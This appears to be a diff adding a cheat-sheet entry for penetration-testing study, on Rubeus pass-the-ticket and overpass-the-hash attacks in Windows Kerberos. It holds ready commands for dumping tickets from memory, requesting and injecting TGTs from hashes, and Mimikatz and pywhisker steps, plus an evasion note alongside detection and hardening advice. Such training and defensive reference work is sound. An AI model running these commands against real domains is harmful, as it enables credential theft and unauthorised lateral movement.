@@ -1,0 +1,118 @@
+{
+  "id": "rubeus-ptt",
+  "name": "Rubeus - Pass the Ticket / OverPass the Hash",
+  "command": "Rubeus.exe asktgt /domain:<domain> /user:<user> /rc4:<nt_hash> /ptt",
+  "description": "Rubeus handles Kerberos ticket abuse on Windows. dump lists tickets; asktgt requests a TGT from an RC4/AES key (OverPass the Hash) and /ptt injects it; ptt loads a .kirbi or base64 ticket; createnetonly spawns a sacrificial logon session.",
+  "platform": "windows",
+  "requires": [
+    "hash"
+  ],
+  "protocols": [
+    "tcp"
+  ],
+  "tools": [
+    "rubeus"
+  ],
+  "tags": [
+    "rubeus",
+    "pass-the-ticket",
+    "kerberos",
+    "overpass-the-hash"
+  ],
+  "category": "Lateral Movement",
+  "subcategory": "Pass the Ticket",
+  "certifications": [
+    "CPTS",
+    "OSCP",
+    "CRTP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 10: Password Attacks",
+  "examples": [
+    {
+      "label": "Dump tickets from memory",
+      "command": "Rubeus.exe dump /nowrap"
+    },
+    {
+      "label": "Request a TGT with AES key",
+      "command": "Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap"
+    },
+    {
+      "label": "OverPass the Hash and inject",
+      "command": "Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt"
+    },
+    {
+      "label": "Inject a saved ticket",
+      "command": "Rubeus.exe ptt /ticket:ticket.kirbi"
+    }
+  ],
+  "notes": "Rubeus requests/injects Kerberos tickets (`asktgt`, `ptt`) - inject a TGT/TGS into your session to access services as that user. Pairs with roasting/delegation abuse.\nAlso covered in: OSCP PEN-200 Chapter 19 (Password Attacks)",
+  "references": [
+    {
+      "title": "HTB Academy - Password Attacks",
+      "url": "https://academy.hackthebox.com/module/details/147"
+    },
+    {
+      "title": "Rubeus",
+      "url": "https://github.com/GhostPack/Rubeus"
+    },
+    {
+      "title": "OffSec PEN-200",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "mimikatz-ptt",
+      "note": "Injects Kerberos tickets into the current session on Windows."
+    },
+    {
+      "id": "ptc-gettgt",
+      "rel": "prereq",
+      "note": "Obtain a TGT to inject."
+    }
+  ],
+  "variations": [
+    {
+      "label": "Dump Tickets",
+      "command": "Rubeus.exe dump /nowrap"
+    },
+    {
+      "label": "AskTGT (AES256)",
+      "command": "Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<aes_key> /nowrap"
+    },
+    {
+      "label": "OverPass (RC4 + PtT)",
+      "command": "Rubeus.exe asktgt /domain:<domain> /user:<user> /rc4:<nt_hash> /ptt"
+    },
+    {
+      "label": "Inject Ticket",
+      "command": "Rubeus.exe ptt /ticket:<ticket.kirbi>"
+    },
+    {
+      "label": "Sacrificial Process",
+      "command": "Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\cmd.exe\" /show"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1550.003"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Rubeus ptt injects a base64/.kirbi Kerberos ticket into the session (or requests then passes one) for PtT on Windows.",
+    "prerequisites": "A valid/forged ticket (or the means to request one) and a Windows session.",
+    "impact": "Authenticated access as the ticket's principal via PtT.",
+    "detection": "[MITRE T1550.003] Anomalous Kerberos activity: a TGS used without a preceding TGT the DC issued; tickets with unusual lifetimes/encryption (RC4 where AES is standard); 4768/4769 anomalies; a ticket used from an unexpected host.",
+    "artifacts": "A Rubeus-injected ticket in the session; klist entry; service access.",
+    "prevention": "[MITRE T1550.003 M1026] limit privileged ticket exposure and reset krbtgt (twice) after compromise; enforce AES; monitor for forged/anomalous tickets; Protected Users group for sensitive accounts.",
+    "evasion": "Passing a legitimately-stolen ticket produces no auth failures and reuses valid Kerberos - realistic ticket lifetimes/AES make it blend with normal traffic.",
+    "sources": [
+      "HTB M10",
+      "MITRE T1550.003"
+    ],
+    "misconfiguration": "Pass-the-Certificate (PtC) attacks exploit ADCS certificate abuse (ESC1/ESC8) combined with Kerberos PKINIT. Shadow credentials (pywhisker) exploit write access to msDS-KeyCredentialLink to add a certificate-based authentication mechanism to any account. Pass-the-Ticket works because Kerberos tickets are extractable from LSASS memory.",
+    "vulnerable_config": "# msDS-KeyCredentialLink writable by attacker (GenericWrite on target account):\n# pywhisker.py -t targetuser -a add\n# Adds a fake device credential -> obtain certificate for targetuser\n# -> PKINIT TGT as targetuser -> NTLM hash via UnPAC\n\n# LSASS memory contains TGTs for all logged-in users:\n# Mimikatz: sekurlsa::tickets /export\n# Rubeus: dump /all",
+    "secure_config": "# Prevent msDS-KeyCredentialLink abuse:\n# Audit who has GenericWrite on privileged accounts\n# Only SYSTEM/DCs should write msDS-KeyCredentialLink\nGet-ObjectAcl -Identity admin -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'Write'}\n\n# Prevent ticket extraction:\n# Enable Credential Guard (blocks LSASS memory reads)\n# Protected Users group members: tickets not cached in LSASS\n\n# ADCS: prevent ESC1/ESC8 (see those cards)\n# Monitor: Event 4768 with certificate auth, Event 4769 unusual ticket lifetimes"
+  }
+}
